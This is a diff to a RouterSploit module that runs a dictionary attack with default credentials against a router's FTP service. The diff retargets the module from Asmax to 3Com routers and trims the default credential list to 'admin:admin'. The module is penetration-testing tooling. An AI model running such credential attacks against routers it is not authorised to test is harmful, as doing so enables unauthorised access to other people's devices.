@@ -1,17 +1,19 @@
 from routersploit.core.exploit import *
-from routersploit.modules.creds.generic.ftp_default import Exploit as FTPDefault
+
+# hack to import from directory/filename starting with a number
+FTPDefault = utils.import_exploit("routersploit.modules.creds.generic.ftp_default")
 
 
 class Exploit(FTPDefault):
     __info__ = {
-        "name": "Asmax Router Default FTP Creds",
-        "description": "Module performs dictionary attack against Asmax Router FTP service. "
+        "name": "3Com Router Default FTP Creds",
+        "description": "Module performs dictionary attack against 3Com Router FTP service. "
                        "If valid credentials are found, they are displayed to the user.",
         "authors": (
             "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
         ),
         "devices": (
-            "Asmax Router",
+            "3Com Router",
         ),
     }
 
@@ -19,4 +21,4 @@ class Exploit(FTPDefault):
     port = OptPort(21, "Target FTP port")
 
     threads = OptInteger(1, "Number of threads")
-    defaults = OptWordlist("admin:admin,support:support,user:user", "User:Pass or file with default credentials (file://)")
+    defaults = OptWordlist("admin:admin", "User:Pass or file with default credentials (file://)")
